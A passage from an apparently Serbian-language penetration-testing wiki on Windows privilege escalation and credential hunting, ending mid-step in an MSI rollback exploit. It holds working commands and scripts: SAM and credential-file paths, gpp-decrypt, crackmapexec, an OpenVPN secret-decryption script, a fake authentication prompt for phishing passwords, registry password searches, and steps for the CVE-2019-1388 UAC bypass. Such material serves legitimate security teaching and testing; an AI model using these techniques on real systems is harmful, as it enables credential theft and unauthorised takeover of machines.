       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) rezervne kopije mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Prioritetno pregledajte lokalno dostupne direktorijume sa rezervnim kopijama ili image datotekama, a pre izdvajanja proverite **nazive članova** image datoteke; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene `install.wim`, `boot.wim` i recovery image datoteke često su pogrešan trag. SMB deljeni resurs predstavlja zaseban način pristupa i treba ga proveriti samo ako je taj resurs u opsegu provere. Pogledajte Microsoft-ove [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je bila dostupna funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara pomoću Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke u ovim GPP-ovima, šifrovane pomoću AES256 algoritma i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik, jer je korisnicima moglo omogućiti da dobiju povišene privilegije.

Da bi se ovaj rizik umanjio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i pronalazi one koje sadrže neprazno polje „cpassword“. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži pojedinosti o GPP-u i lokaciji datoteke, što pomaže u identifikaciji i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Za dešifrovanje cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web konfiguracija

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config fajla sa akreditivima:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP backup arhiva postavljena direktno u webroot koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive kredencijale. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` je samo jedna od mogućnosti. Brz lokalni popis može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne potvrđuje da ona sadrži tajnu niti da pronađeni podaci za prijavu omogućavaju viši nivo privilegija.

### OpenVPN podaci za prijavu

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dnevnici

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih možda zna (imajte na umu da je direktno **traženje** **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže podatke za autentifikaciju**

Poznate datoteke koje su nekada sadržale **lozinke** u **obliku čistog teksta** ili u Base64 formatu

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Poklapanje naziva datoteke tretirajte kao moguću šifrovanu trezorsku datoteku; njeno prisustvo ne znači da možete da je pročitate, otključate ili koristite bilo koje sačuvane akreditive. Proverite dostupne korisničke profile i konfigurisane korene deljenih datoteka kada pregledate gde se takve datoteke čuvaju.

Čitljiva KeePass `.kdbx` datoteka takođe je samo pokazatelj da možda postoji šifrovani trezor. Za otključavanje su potrebni stvarna glavna lozinka i sve konfigurisane datoteke ključeva ili faktori naloga. Ako ovlašćeni pregled pronađe par LM:NT hash vrednosti u unosu, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen od strane NTLM servisa na odredištu pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje Administrator ili SYSTEM prava; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava naloga i svaki zaseban korak izvršavanja servisa. U inventaru treba navesti putanju trezorske datoteke i da li je čitljiva, a ne prikazivati bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u RecycleBin-u

Proverite dostupne stavke u korpi za otpatke i potražite obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara i nekoliko meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u zapisu `$I`, a obrisanu datoteku kao odgovarajući unos `$R`; pre otvaranja arhive proverite metapodatke i da li trenutni identitet ima pristup za čitanje. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazna lista ne dokazuje da ne postoji povratljiva rezervna kopija. Naziv arhive posmatrajte kao kandidat za proveru, a ne kao dokaz da sadrži važeću tajnu.

Dostupna obrisana datoteka `.pfx` može ukazivati i na **code-signing**. Ako sadrži dostupan privatni ključ, taj ključ može da potpiše izmenjenu PowerShell skriptu; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [AppLocker pravila za izdavače proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni konkretnu skriptu, da efektivno pravilo prihvata dobijeni potpis za skriptu i ciljni nalog, kao i da zakazani zadatak ili drugi potrošač sa višim privilegijama zaista pokreće skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta sa dozvolom za pisanje ne dokazuju da je ovaj lanac uspostavljen. Pre otvaranja materijala privatnog ključa ili pokretanja zadatka proverite metapodatke, ACL-ove, smernice i zakazanu komandu.

Proverite i dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke u potrazi za akreditivima. Izvoz ključa za oporavak BitLocker-a može biti sačuvan kao HTML ili TXT, ponekad unutar imenovane arhive rezervne kopije. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu sa starijim rezervnim kopijama; proverite volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, oporavak akreditiva domena van mreže zahteva i odgovarajuće `SYSTEM` hive, kao što je opisano u [radnom postupku za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sami nazivi datoteka i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje openssh ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i favorite pregledača, jer su tamo možda sačuvane neke **lozinke**.

Za uobičajeni profil **Default** pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da je promene. Prisustvo datoteke samo ukazuje na moguću lokaciju sačuvanih akreditiva: proverite da li su datoteke čitljive, da li imate odgovarajući DPAPI kontekst korisnika ili drugi odobreni ključni materijal i da li sačavljena prijava pripada nalogu sa višim privilegijama. Samo popisivanje putanja ne mora da otvara bazu podataka niti da prikazuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu odgovarajuće datoteke ključa i šifrovanih prijava. Njihovo prisustvo samo ukazuje na moguću lokaciju: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li je ključ zaštićen pomoću Primary Password pre nego što zaključite da su akreditivi upotrebljivi. Ako oporavljeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupom i prava grupe za [čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne potvrđuju putanju do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta se **identifikuje pomoću ID-a klase (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, koji se identifikuju pomoću ID-ova interfejsa (IID).

COM klase i interfejsi definisani su u registru, pod ključevima **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**, redom. Ovaj registar se kreira spajanjem ključeva **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

U okviru CLSID-ova ovog registra možete pronaći podključ **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL** i vrednost pod nazivom **ThreadingModel**, koja može biti **Apartment** (jednonitni), **Free** (višenitni), **Both** (jednonitni ili višenitni) ili **Neutral** (nezavisan od niti).

![Istorija pregledača - COM DLL Overwriting: U okviru CLSID-ova ovog registra možete pronaći podključ InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **prepišete bilo koji DLL** koji će biti izvršen, mogli biste da **eskalirate privilegije** ako taj DLL izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam za održavanje prisustva, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretražite datoteku sa određenim nazivom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registry u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alatke koje traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da **automatski pokrene svaki Metasploit POST modul koji traži akreditive** na žrtvinom sistemu.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve fajlove koji sadrže lozinke pomenute na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedna odlična alatka za izdvajanje lozinki iz sistema.

Alatka [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alatki koje čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Procureli handle-ovi

Zamislite da **proces koji se izvršava kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasledi sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle ka privilegovanom procesu koji je kreiran** pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer da biste saznali više o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i [**ovaj post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) za potpunije objašnjenje kako da testirate i zloupotrebite dodatne otvorene handle-ove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo punim pristupom).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacija klijenta Named Pipe-a

Segmenti deljene memorije, poznati kao **pipe-ovi**, omogućavaju komunikaciju procesa i prenos podataka.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na klijent/server arhitekturu, u kojoj su uloge definisane kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Ako pronađete **privilegovani proces** koji komunicira putem pipe-a koji možete da oponašate, možete da **dobijete veće privilegije** preuzimanjem identiteta tog procesa kada on stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada možete pronaći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat omogućava i **presretanje komunikacije putem named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privesc vektora:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Udaljeni DWORD upis preko Telephony tapsrv-a do RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju može da upisuje `NETWORK SERVICE`, a zatim dobije Telephony administratorska prava i učita proizvoljnu DLL datoteku kao servis. Ceo tok:

- Pozovite `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju može da se upisuje → servis je otvara pomoću `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrone upise događaja.
- Svaki događaj upisuje napadačev `InitContext` iz `Initialize` u taj handle. Registrujte line aplikaciju pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaje pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/isključite da biste ponavljali determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, pa pozovite `GetUIDllName` sa proizvoljnom putanjom do DLL datoteke da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Ostalo

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderera

Klikabilne Markdown veze prosleđene funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta u nastavku beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz neprivilegovanog korisničkog naloga.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a, koristeći istu ranjivost. Pored toga, ne morate ništa da instalirate, a binarna datoteka koja se koristi tokom procesa potpisana je i izdata od strane kompanije Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload Directory Junctions into a Served Root

Aplikacija može da kreira predvidljiv upload poddirektorijum, upiše ime datoteke koje je dostavio pozivalac i zatim obradi datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisivanja sa serverske strane, upis može da prati junction do direktorijuma koji se servira preko weba. Skripta postavljena tamo može da se pokrene pod identitetom web-service naloga ako server izvršava taj tip datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za upload sa dozvolom za upis ili postojeći junction sami po sebi nisu dokaz za to.

Proverite tačno sastavljanje putanje i tajming u upload handler-u, efektivne dozvole korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li writer prati reparse points i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa writer-a i web server-a. Pasivni inventar može da prikaže ACL-ove direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje handler-a ili buduću zamenu junction-a. Ako izvršavanje završi pod nalogom servisa, pregledajte **stvarni process token** pre nego što razmotrite zaseban put preko token-privilege-a.

## Od Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

Tehnika opisana [**u ovom blog post-u**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe funkcije rollback u Windows Installer-u da bi se legitimne datoteke zamenile zlonamernim tokom deinstalacije. Za to napadač treba da napravi **zlonamerni MSI installer** koji će se koristiti za preuzimanje kontrole nad fasciklom `C:\Config.Msi`, koju će Windows Installer kasnije koristiti za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa. Rollback datoteke će biti izmenjene tako da sadrže zlonamerni payload.

Sažetak tehnike:

1. **Faza 1 – Priprema za preuzimanje kontrole (ostaviti `C:\Config.Msi` praznu)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u fasciklu u koju je moguće upisivati (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren handle ka datoteci nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u `.rbf` datoteke (rollback rezervne kopije).
    - **Ispitujte otvoreni file handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođeno sinhronizovanje
    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada primite signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da izbriše `.rbf`, a pošto ne može da izbriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno izbrišite `.rbf`
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazna** i spremna za preuzimanje kontrole.

> U ovom trenutku **pokrenite ranjivost произвољног брисања фасцикле на нивоу SYSTEM-а** да бисте избрисали `C:\Config.Msi`.

2. **Фаза 2 – Замена rollback скрипти злонамерним скриптама**

- Корак 6: Поново направите `C:\Config.Msi` са слабим ACL-овима
    - Сами поново направите фасциклу `C:\Config.Msi`.
    - Подесите **слабе DACL-ове** (нпр. Everyone:F) и **оставите отворен handle** са `WRITE_DAC`.

- Корак 7: Покрените другу инсталацију
    - Поново инсталирајте `.msi`, уз:
        - `TARGETDIR`: локацију у коју је могуће уписивати.
        - `ERROROUT`: променљиву која изазива принудни неуспех.
    - Ова инсталација ће се користити за поновно покретање **rollback-а**, који чита `.rbs` и `.rbf`.

- Корак 8: Пратите појаву `.rbs` датотеке
    - Користите `ReadDirectoryChangesW` да надгледате `C:\Config.Msi` док се не појави нова `.rbs` датотека.
    - Забележите њено име.

- Корак 9: Синхронизујте пре rollback-а
    - `.msi` садржи **прилагођену install акцију (`SyncBeforeRollback`)** која:
        - Сигнализира када је `.rbs` креиран.
        - Затим **чека** пре него што настави.

- Корак 10: Поново примените слабе ACL-ове
    - Након пријема догађаја `.rbs created`:
        - Windows Installer **поново примењује јаке ACL-ове** на `C:\Config.Msi`.
        - Али пошто и даље имате handle са `WRITE_DAC`, можете поново **применити слабе ACL-ове**.

> ACL-ови се **проверавају само приликом отварања handle-а**, па и даље можете да пишете у фасциклу.

- Корак 11: Поставите лажне `.rbs` и `.rbf` датотеке
